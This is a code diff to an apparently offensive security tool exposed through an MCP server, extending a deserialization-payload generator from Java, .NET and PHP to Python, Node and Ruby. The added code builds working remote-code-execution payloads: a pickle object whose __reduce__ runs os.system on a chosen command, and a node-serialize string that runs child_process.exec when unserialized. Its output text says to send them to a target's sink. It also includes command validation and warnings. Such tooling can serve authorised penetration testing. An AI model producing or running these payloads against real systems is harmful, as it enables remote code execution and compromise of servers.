@@ -113,7 +113,9 @@ def register(mcp: FastMCP):
         DROP TABLE blocked).
 
         Args:
-            language: java | dotnet | php
+            language: java | dotnet | php (external ysoserial/phpggc) OR
+                python | node | ruby (in-process pickle / node-serialize / Ruby-
+                Marshal-template — no external tool)
             gadget: Java: CommonsCollections1..7, Spring1, Spring2, ROME,
                 Hibernate1..2, etc. .NET: TypeConfuseDelegate,
                 ActivitySurrogateSelector, WindowsIdentity, etc. PHP (phpggc
@@ -132,15 +134,63 @@ def register(mcp: FastMCP):
         )
 
         lang = language.lower().strip()
-        if lang not in {"java", "dotnet", ".net", "php"}:
-            return f"Unknown language '{language}'. Use 'java', 'dotnet', or 'php'."
-        if lang == ".net":
-            lang = "dotnet"
+        _ALIASES = {".net": "dotnet", "nodejs": "node", "js": "node", "python3": "python", "py": "python"}
+        lang = _ALIASES.get(lang, lang)
+        if lang not in {"java", "dotnet", "php", "python", "node", "ruby"}:
+            return (f"Unknown language '{language}'. Use java | dotnet | php | "
+                    "python | node | ruby.")
 
         ok, why = validate_payload(command, vuln_type="deserialization")
         if not ok:
             return f"REFUSED: {why}"
         warning = soc_loud_warning(command)
+
+        # In-process generators for the interpreted-language sinks the KB detects
+        # (pickle / node-serialize / Ruby Marshal) — no external tool. Benign
+        # marker command by default; the payload REACHING the sink proves impact.
+        if lang in ("python", "node", "ruby"):
+            import base64 as _b64
+            if lang == "python":
+                # pickle whose __reduce__ calls os.system(command) on load.
+                import os as _os
+                import pickle as _pickle
+
+                class _PickleRCE:
+                    def __reduce__(self):
+                        return (_os.system, (command,))
+                raw = _pickle.dumps(_PickleRCE(), protocol=2)
+                note = ("Sink: pickle.loads / cPickle / pandas.read_pickle / "
+                        "PyYAML yaml.load(Loader=Loader) / jsonpickle.")
+            elif lang == "node":
+                # node-serialize: an IIFE in a function property runs on unserialize().
+                inner = (command.replace("\\", "\\\\").replace("'", "\\'"))
+                body = (f"function(){{ require('child_process')"
+                        f".exec('{inner}', function(e,so,se){{console.log(so)}}); }}()")
+                raw = ('{"rce":"_$$ND_FUNC$$_' + body + '"}').encode()
+                note = "Sink: node-serialize unserialize() / funcster. The trailing () triggers immediately."
+            else:  # ruby — Marshal universal gadget is version-sensitive; emit the
+                # canonical ERB-via-Marshal template rather than a wrong opcode blob.
+                raw = (f"# Ruby Marshal RCE is version-specific — generate on the target's Ruby:\n"
+                       f"#   ruby -rerb -e 'puts Marshal.dump(...gadget wrapping "
+                       f"`{command}`...)'  (universal Gem gadget for the target Ruby version)\n"
+                       f"# Sink: Marshal.load / YAML.load (Psych) / Oj.load(mode:>=:object).").encode()
+                note = "Ruby: template only — Marshal gadget bytes depend on the target Ruby version."
+            if encode == "base64":
+                payload_str = _b64.b64encode(raw).decode()
+            elif encode == "hex":
+                payload_str = raw.hex()
+            else:
+                payload_str = raw.decode("latin-1", errors="replace")
+            lines = [f"{lang} deserialization gadget, command={command!r} "
+                     f"({len(raw)} bytes, {encode}):"]
+            if warning:
+                lines.append(f"  warning: {warning}")
+            lines += ["", note, "", "Payload:"]
+            for i in range(0, len(payload_str), 100):
+                lines.append(payload_str[i:i + 100])
+            lines.append("\nSend it into the sink via curl_request/send_raw_request; "
+                         "confirm the benign marker (e.g. `id` output) in the response.")
+            return "\n".join(lines)
 
         if lang == "java":
             tool = "ysoserial"
